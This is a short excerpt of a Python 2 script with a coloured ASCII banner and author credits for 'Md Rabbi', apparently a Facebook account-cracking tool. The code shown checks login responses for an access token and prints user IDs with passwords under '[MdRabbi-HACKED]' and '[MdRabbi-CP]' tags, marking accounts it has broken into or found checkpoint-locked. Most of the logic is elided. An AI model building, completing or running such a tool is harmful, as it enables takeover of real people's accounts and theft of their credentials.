...
\033[0;94m __  __     _    ____       _     _     _  

\033[0;94m |  \/  | __| |  |  _ \ __ _| |__ | |__ (_)

\033[0;95m | |\/| |/ _` |  | |_) / _` | '_ \| '_ \| | 

\033[0;95m | |  | | (_| |  |  _ < (_| | |_) | |_) | |

\033[0;96m |_|  |_|\__,_|  |_| \_\__,_|_.__/|_.__/|_|

""")

print("\033[0;91mThis Tool's Free By Md Rabbi")
...
def menu():
    ...
    print '\033[0;93mAUTHOR   : Md Rabbi'

    print '\033[0;94mFACEBOOK : ItsMdRabbiOfficial'

    print '\033[0;96mGITHUB   : MdRabbiOfficial-01'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;92m[MdRabbi-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                ...
                print '\x1b[1;91m[MdRabbi-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
